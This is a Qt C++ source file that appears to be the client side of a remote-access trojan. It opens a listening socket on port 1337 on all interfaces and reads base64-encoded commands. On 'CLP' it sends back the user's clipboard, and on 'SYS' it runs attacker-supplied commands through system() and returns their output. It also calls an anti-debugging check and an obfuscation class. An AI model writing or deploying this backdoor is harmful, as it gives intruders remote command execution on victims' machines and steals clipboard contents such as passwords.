#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <cstdlib>



MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    this->serversocket = new QTcpServer(this);
    this->yametedebug->checkDebugged();
    QString test= "test1";
    crypto *testcrypto = new crypto();
    //qDebug() << this->testcrypto->obfuscate(test,testcrypto->getKey()); //testing crypto implementation
    if(!this->serversocket->listen(QHostAddress::Any,1337))
    {
        qDebug() << "The server could not start";
    }
    connect(serversocket,&QTcpServer::newConnection, this,&MainWindow::incomingConnection);
}

void MainWindow::incomingConnection(){
  QTcpSocket *newSocket = serversocket->nextPendingConnection();
  this->currentSocket = newSocket;

  connect(newSocket, &QAbstractSocket::readyRead, this, &MainWindow::read);
}

void MainWindow::read(){
  QString returnStr= QString(QByteArray::fromBase64(this->currentSocket->readAll()));
  if(returnStr.contains("CLP")){
        MainWindow::sendCmd(this->clippy->getclipboardString(),this->currentSocket);
  }
  else if(returnStr.contains("SYS")){ //SYS commands are here to receive command to pass to system and give back the return
    returnStr.remove(0,4).replace("\n", "");
    system(qPrintable("cd /dev/shm;" + returnStr + "> command.txt"));
    QFile *file = new QFile("/dev/shm/command.txt");
    if(!file->open(QIODevice::ReadWrite)){
        qWarning("Couldn't save the file");
    }
    QTextStream in(file);
    QString output = in.readAll(); //have to read from a file, since system just returns 0 or exit message that are integers
    system(qPrintable("cd /dev/shm; rm command.txt"));
    MainWindow::sendCmd(output,this->currentSocket);
  }
}

void MainWindow::sendCmd(QString cmd,QTcpSocket *newsocket){ //taken from the server part, just gives back the answer here
  qDebug() << cmd;
  newsocket->write((cmd + "\n").toUtf8().toBase64());
  newsocket->flush();
}
MainWindow::~MainWindow(){
    delete ui;
}

